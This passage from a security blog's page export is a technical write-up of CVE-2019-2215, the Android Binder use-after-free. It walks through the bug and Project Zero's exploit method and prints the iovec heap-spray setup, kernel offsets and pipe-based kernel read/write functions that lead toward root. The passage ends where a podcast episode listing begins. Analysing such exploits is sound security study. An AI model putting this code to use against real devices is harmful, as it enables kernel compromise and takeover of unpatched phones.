of two QWORDS (8 byte data) on 64-bit systems.</p><pre><code class=\"language-c\">struct iovec { \t\t// Size: 0x10\n    void *iov_base;\t// 0x00\n    size_t iov_len; // 0x08\n}\n</code></pre><h2 id=\"vulnerability-details\">Vulnerability details</h2><p>The Binder driver has a cleanup routine you can trigger from <code>ioctl()</code> before actually closing the driver. If you're familiar with drivers and cleanup routines, you can likely already guess why this is can cause issues.</p><p>Let's look at the p0 report summary.</p><!--kg-card-begin: markdown--><blockquote>\n<p>As described in the upstream commit:</p>\n<p>“binder_poll() passes the thread-&gt;wait waitqueue that<br>\ncan be slept on for work. When a thread that uses<br>\nepoll explicitly exits using BINDER_THREAD_EXIT,<br>\nthe waitqueue is freed, but it is never removed<br>\nfrom the corresponding epoll data structure. When<br>\nthe process subsequently exits, the epoll cleanup<br>\ncode tries to access the waitlist, which results in<br>\na use-after-free.</p>\n</blockquote>\n<!--kg-card-end: markdown--><p>This summary is a bit misleading. The use-after-free is not on the waitqueue itself. The waitqueue is an inline struct in the <code>binder_thread</code> structure, the <code>binder_thread</code> object is what's actually UAF'd. The reason they mention the waitqueue directly in this commit summary is this issue was originally found by Google's Syzkaller fuzzer back in 2017, and the fuzzer triggered a use-after-free detected by the Kernel Address Sanitizer (KASAN) on the waitqueue's mutex.</p><h3 id=\"the-free\">The free</h3><p>Let's take a look at the ioctl command in question, <code>BINDER_THREAD_EXIT</code>.</p><pre><code class=\"language-c\">static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\t// [...]\n    \n    switch (cmd) {\n\t// [...]\n\tcase BINDER_THREAD_EXIT:\n\t\tbinder_debug(BINDER_DEBUG_THREADS, \"%d:%d exit\\n\",\n\t\t\t     proc-&gt;pid, thread-&gt;pid);\n\t\tbinder_free_thread(proc, thread);\n\t\tthread = NULL;\n\t\tbreak;\n     // [...]\n    }\n}\n\n// [...]\n\nstatic int binder_free_thread(struct binder_proc *proc,\n\t\t\t      struct binder_thread *thread)\n{\n\tstruct binder_transaction *t;\n\tstruct binder_transaction *send_reply = NULL;\n\tint active_transactions = 0;\n\n\t// [...]\n    \n\twhile (t) {\n\t\tactive_transactions++;\n\t\t// [...]\n\t}\n\tif (send_reply)\n\t\tbinder_send_failed_reply(send_reply, BR_DEAD_REPLY);\n\tbinder_release_work(&amp;thread-&gt;todo);\n\tkfree(thread);\n\tbinder_stats_deleted(BINDER_STAT_THREAD);\n\treturn active_transactions;\n}\n</code></pre><p>The critical line of code here is line 2610, <code>kfree(thread)</code>. This is where the \"free\" part of the use-after-free happens.</p><h3 id=\"the-use-after-free-\">The use (after free)</h3><p>Now that we've seen where the free happens, let's try to see where the use happens. The stack trace from the KASAN report will be helpful for this.</p><pre><code class=\"language-text\">Call Trace:\n  ...\n  _raw_spin_lock_irqsave+0x96/0xc0 kernel/locking/spinlock.c:159\n  remove_wait_queue+0x81/0x350 kernel/sched/wait.c:50\n  ep_remove_wait_queue fs/eventpoll.c:595 [inline]\n  ep_unregister_pollwait.isra.7+0x18c/0x590 fs/eventpoll.c:613\n  ep_free+0x13f/0x320 fs/eventpoll.c:830\n  ep_eventpoll_release+0x44/0x60 fs/eventpoll.c:862\n  ...\n</code></pre><p>At first, it can be a bit confusing because the <code>binder_thread</code> object is referenced indirectly, ie. if you ctrl + f for <code>binder_thread</code> you won't find any occurrences. However, if we quickly look at <code>ep_unregister_pollwait()</code>:</p><pre><code class=\"language-c\">static void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)\n{\n\tstruct list_head *lsthead = &amp;epi-&gt;pwqlist;\n\tstruct eppoll_entry *pwq;\n\n\twhile (!list_empty(lsthead)) {\n\t\tpwq = list_first_entry(lsthead, struct eppoll_entry, llink);\n\n\t\tlist_del(&amp;pwq-&gt;llink);\n\t\tep_remove_wait_queue(pwq);\n\t\tkmem_cache_free(pwq_cache, pwq);\n\t}\n}\n</code></pre><p>We'll notice our free'd <code>binder_thread</code> is in <code>epoll_entry</code>'s linked list, and eventually will be what <code>pwq</code> is.</p><pre><code class=\"language-c\">static void ep_remove_wait_queue(struct eppoll_entry *pwq)\n{\n\twait_queue_head_t *whead;\n\n\trcu_read_lock();\n\t/*\n\t * If it is cleared by POLLFREE, it should be rcu-safe.\n\t * If we read NULL we need a barrier paired with\n\t * smp_store_release() in ep_poll_callback(), otherwise\n\t * we rely on whead-&gt;lock.\n\t */\n\twhead = smp_load_acquire(&amp;pwq-&gt;whead);\n\tif (whead)\n\t\tremove_wait_queue(whead, &amp;pwq-&gt;wait);\n\trcu_read_unlock();\n}\n</code></pre><p>We can see that <code>pwq</code> is used in two places. One is the head of the linked list for the wait queues, <code>whead</code>. The other is the wait queue object itself being deleted via <code>remove_wait_queue</code>.</p><p>At first glance it seems both arguments to <code>remove_wait_queue</code> should be relatively close in memory, but the <code>smp_load_acquire()</code> macro needs to be considered. This macro is a memory barrier. Initially I assumed this macro just added some compiler stuff for atomic access to <code>whead</code>, but this was a mistake. What's not entirely obvious is <code>smp_load_acquire()</code> macro dereferences what's passed to it. So what I originally read as <code>whead = &amp;pwq-&gt;whead</code> is actually more like <code>whead = *(wait_queue_head_t *)&amp;pwq-&gt;whead</code>, or more simply, <code>whead = pwq-&gt;whead</code>.</p><p>Let's look at <code>remove_wait_queue()</code>.</p><pre><code class=\"language-c\">// WRITE-UP COMMENT: q points into stale data / the UAF object\nvoid remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)\n{\n\tunsigned long flags;\n\n\tspin_lock_irqsave(&amp;q-&gt;lock, flags);\n\t__remove_wait_queue(q, wait);\n\tspin_unlock_irqrestore(&amp;q-&gt;lock, flags);\n}\n</code></pre><p>When the head of the linked list ends up being our UAF'd <code>binder_thread</code>, <code>q</code> points to stale data. This is why a KASAN crash occurs on the spinlock - it will attempt to lock the mutex on <code>q</code>, which is free'd memory.</p><p>On normal devices not using KASAN instrumentation, if you run the Proof-of-Concept (PoC) as-is you likely won't notice anything. It's highly likely that no crash will occur, which may lead you to (incorrectly) assume the device is not vulnerable. This is because it is very likely <code>q</code> still points to valid, stale heap data. However, if you perform a heap spray of <code>0x41</code>'s, you will trigger a CPU stall, which will cause your device to freeze.</p><p>This is because a lock is essentially just an integer that's set to either 0 (for unlocked) or 1 (for locked). Technically, if the mutex is set to any value that's not zero, it's considered locked. Because an attacker-controlled heap spray will essentially lock the mutex without going through proper channels, this mutex will be permanently locked, which will cause a deadlock and freeze the device.</p><p>It's worth noting this object resides in the <code>kmalloc-512</code> cache, which is a pretty decent cache for exploitation because it's not used a lot by background processes compared to smaller caches. On kernel v4.4.177, the object is <code>0x190</code> or 400 bytes in size. Because of this size being so far from both <code>kmalloc-256</code> and <code>kmalloc-512</code> - it's a fair assumption that this object ends up in the <code>kmalloc-512</code> cache on most if not all devices.</p><h2 id=\"leaking-the-kernel-task-struct\">Leaking the kernel task struct</h2><h3 id=\"weaponizing-an-unlink\">Weaponizing an unlink</h3><p>The way this vulnerability was exploited was quite clever. The exploit takes advantage of a linked list unlink operation. This can be used on an overlapped object to corrupt it using the linked list meta-data.</p><p>Assuming the spinlock doesn't deadlock on an invalid mutex due to memory corruption, eventually the next <code>ep_remove_wait_queue()</code>'s <code>&amp;pwq-&gt;wait</code> reference will point into our UAF'd object. Consider what <code>remove_wait_queue()</code>, and inevitably, <code>__remove_wait_queue()</code>, does on this structure:</p><pre><code class=\"language-c\">// WRITEUP COMMENT: old points to stale data / the UAF object\nstatic inline void\n__remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)\n{\n\tlist_del(&amp;old-&gt;task_list);\n}\n// ...\nstatic inline void list_del(struct list_head *entry)\n{\n\t__list_del(entry-&gt;prev, entry-&gt;next);\n\tentry-&gt;next = LIST_POISON1;\n\tentry-&gt;prev = LIST_POISON2;\n}\n// ...\nstatic inline void __list_del(struct list_head * prev, struct list_head * next)\n{\n\tnext-&gt;prev = prev;\n\tWRITE_ONCE(prev-&gt;next, next);\n}\n</code></pre><p>The main line of importance here is <code>next-&gt;prev = prev</code>, This essentially is an unlink, and writes into our UAF'd object a pointer of the previous object.</p><p>This is useful because if we overlap another kernel object on top of our UAF'd object, we can weaponize this unlink to corrupt data in the overlapped object. This is used by p0 to leak kernel data. Which object is a good candidate for this attack strategy? Enter <code>iovec</code>.</p><p>There are a few properties of the<code>iovec</code> structure that makes it a really good candidate for exploitation here.</p><ol><li>They're small (0x10 in size on 64-bit machines) and you can control all the fields with very few restrictions</li><li>You can stack them and thus control which kmalloc cache your <code>iovec</code> stack ends up in by how many you write with</li><li>They have a pointer (<code>iov_base</code>) which will be a perfect field to corrupt with the unlink.</li></ol><p>Under normal circumstances, <code>iov_base</code> is checked in the kernel anywhere it's used. The kernel will first ensure that <code>iov_base</code> is a userland pointer before processing the request, however using the unlink primitive we just talked about, we can corrupt this pointer post-validation and overwrite it with a kernel pointer, being the <code>prev</code> object in the unlink process.</p><p>This means when we read from a descriptor that was written to with the corrupted <code>iovec</code>, we'll be reading data originating from a kernel pointer, <em>not</em> a userland one like it's intended. This will allow us to leak kernel data relative to the <code>prev</code> pointer, which contains pointers useful enough to allow for arbitrary read/write as well as code execution.</p><p>The tricky step of this process is figuring out which <code>iovec</code>'s index lines up with the waitqueue. This is important because if we don't fake the mutex properly, the device will hang and we won't be able to have any fun on it.</p><p>Finding the offset of the waitqueue is fairly easy if you have a kernel image of the version you're targeting. By looking at a function that uses the waitqueue field of <code>binder_thread</code>, we can easily find the offset in the disassembly. One such function is <code>binder_wakeup_thread_ilocked()</code>. It calls <code>wake_up_interruptible_sync(&amp;thread-&gt;wait)</code>. The offset should be referenced when the address is loaded into the X0 register just before the call.</p><pre><code class=\"language-assembly\">.text:0000000000C0E2B4    ADD    X0, X8, #0xA0\n.text:0000000000C0E2B8    MOV    W1, #1\n.text:0000000000C0E2BC    MOV    W2, #1\n.text:0000000000C0E2C0    TBZ    W19, #0, loc_C0E2CC\n.text:0000000000C0E2C4    BL     __wake_up_sync\n</code></pre><p>On kernel v4.4.177, we can see the wait queue is <code>0xA0</code> bytes into the <code>binder_thread</code> object. Since <code>iovec</code> is 0x10 in size, this means the <code>iovec</code> at index <code>0xA</code> in the array will line up with the wait queue.</p><pre><code class=\"language-c\">#define BINDER_THREAD_SZ 0x190\n#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)\n#define WAITQUEUE_OFFSET 0xA0\n#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)\n</code></pre><p>So how does one pass a valid <code>iov_base</code> address which will pass validation while also keeping the lock at 0 to prevent a deadlock? Since the lock is only a DWORD (4 bytes), and a 64-bit pointer can be passed, you just need to use <code>mmap()</code> to map a userland address where the lower 32-bits are 0.</p><pre><code class=\"language-c\">dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n// ...\n\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nmemset(iovec_array, 0, sizeof(iovec_array));\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq-&gt;task_list-&gt;next */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq-&gt;task_list-&gt;prev */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;\n</code></pre><p>When the exploit runs, the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> will take the place of the mutex, as well as the <code>next</code> pointer in the linked list. The <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> will take the place of the <code>prev</code> pointer in the linked list. This means <code>IOVEC_INDX_FOR_WQ + 1</code>'s <code>iov_base</code> field is the one that will be overwritten with a kernel pointer.</p><p>Let's take a look at the free'd memory in KGDB on a VM running Android-x86 before and after the unlink operation. To do this, I set a breakpoint on the call to <code>remove_wait_queue()</code>. The first argument will point to the free'd memory, so we'll find the pointer in the RDI register. If we examine this memory before the call, we'll see the following:</p><pre><code class=\"language-text\">Thread 1 hit Breakpoint 11, 0xffffffff812811c2 in ep_unregister_pollwait.isra ()\ngdb-peda$ x/50wx $rdi\n0xffff8880959d68a0:     0x00000000      0x00000001      0x00001000      0x00000000\n0xffff8880959d68b0:     0xdeadbeef      0x00000000      0x00001000      0x00000000\n...\n</code></pre><p>Notice the data overlaps with some <code>iovec</code> structures from above - for example we can see 0xdeadbeef at <code>0xffff88809239a6b0</code>.

The attack strategy is basically as follows:</p><ol><li>Create a pipe</li><li>Trigger the free() on the <code>binder_thread</code> object so that the <code>iovec</code> structures allocated in the next step overlap it</li><li>Write the <code>iovec</code> structures into <code>binder_thread</code>'s old memory via the <code>writev()</code> system call on the pipe</li><li>Trigger the use-after-free / unlink to corrupt the <code>iovec</code> structure</li><li>Call <code>read()</code> on the pipe, which will use the uncorrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> to read the <code>dummy_page</code> data.</li><li>Call <code>read()</code> on the pipe again, which will use the corrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> to read kernel data into the leak buffer.</li></ol><p>Because we initialized two <code>iovec</code>'s with an <code>iov_len</code> of 0x1000, ultimately the <code>writev()</code> call will write two pages of data.

The second page will contain kernel data!</p><p>It's easier to handle the reads and writes in two separate threads.

By simply writing the data we want to write to a pipe with <code>write()</code>, and calling <code>read()</code> on the other end of the pipe with a kernel address, we can pipe data to an arbitrary kernel address.</p><p>Conversely, by writing data from an arbitrary kernel address to a pipe, and calling <code>read()</code> on the other end of the pipe, we can pipe data from an arbitrary kernel address. Boom, arbitrary read/write!</p><pre><code class=\"language-c\">int kernel_rw_pipe[2];\n\n//...\n\nif(pipe(kernel_rw_pipe))\n    exitWithError(\"Kernel R/W Pipe failed: %s\", strerror(errno));\n\n//...\n\nvoid kernel_write(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], data, len) != len)\n        exitWithError(\"Failed to write data to kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to write data to kernel (read)!\");\n}\n\nvoid kernel_read(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to read data from kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], data, len) != len)\n        exitWithError(\"Failed to read data from kernel (read)!\");\n}\n</code></pre><h2 id=\"additional-notes\">Additional Notes</h2><p>Some devices (even if they're vulnerable) may fail on the <code>writev()</code> in the leak call, as it'll return 0x1000 instead of the desired 0x2000. This is usually because the offset for the waitqueue is incorrect, therefore the second <code>iovec.iov_base</code> isn't getting smashed with a kernel pointer. This will cause the call to return 0x1000 because the second request will fail, since <code>0xdeadbeef</code> is an unmapped address.</p><p>In this case, you'll have to extract the kernel image for the version you're targeting and pull the proper offsets (or potentially bruteforce it).</p><h2 id=\"conclusion\">Conclusion</h2><p>Once you have kernel read/write, it's basically game over. A root shell is a <code>cred</code> patch away. If you're not on a Samsung device, you can take it a step further and disable SELinux and patch the <code>init_task</code> credentials so every new process that launches post-exploit automatically launches with full privileges. On Samsung devices, I do not believe this is possible without extra work due to their Knox mitigation. On most other devices though, these additional patches shouldn't be an issue.</p><p>It's worth noting that p0's exploit is remarkably stable. It very rarely fails, and when it does it's usually just an error, not a kernel panic, so you just need to run the exploit again and you're good to go. This makes it an awesome temporary root method for people with OEM locked bootloaders like me.</p><p>Overall, I thought this exploit strategy by Jann Horn and Maddie Stone was pretty novel, and I definitely learned a lot breaking it down. It gave me a fresh perspective on use-after-free's, demonstrating that you're not totally out of luck if you can't get a useful primitive from the UAF'd object itself.</p><h2 id=\"references-additional-resources\">References / Additional Resources</h2><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1942\">Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug Tracker) </a></p><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885\">Project Zero Exploit</a></p><p><a href=\"https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ\">Syzkaller kASAN report</a></p><p><a href=\"https://elixir.bootlin.com/linux/v4.4.177/source\">Bootlin Linux kernel source browser</a></p><h2 id=\"credit\">Credit</h2><p>Jann Horn and Maddie Stone for the exploit code referenced in the write-up.</p>","slug":"analyzing-androids-cve-2019-2215-dev-binder-uaf"}},{"node":{"title":"Episode 16 - A Bit of everything: 0days, Breaches, Lawsuits, Attacking AI, and some insecure","path":"/posts/episode-16-a-bit-of-everything-0days-breaches-lawsuits-attacking-ai-and-some-insecure/","date":"5 November 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/xeb7IMo7XMM?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h05m23s\">00:05:23</a>] Apple v.
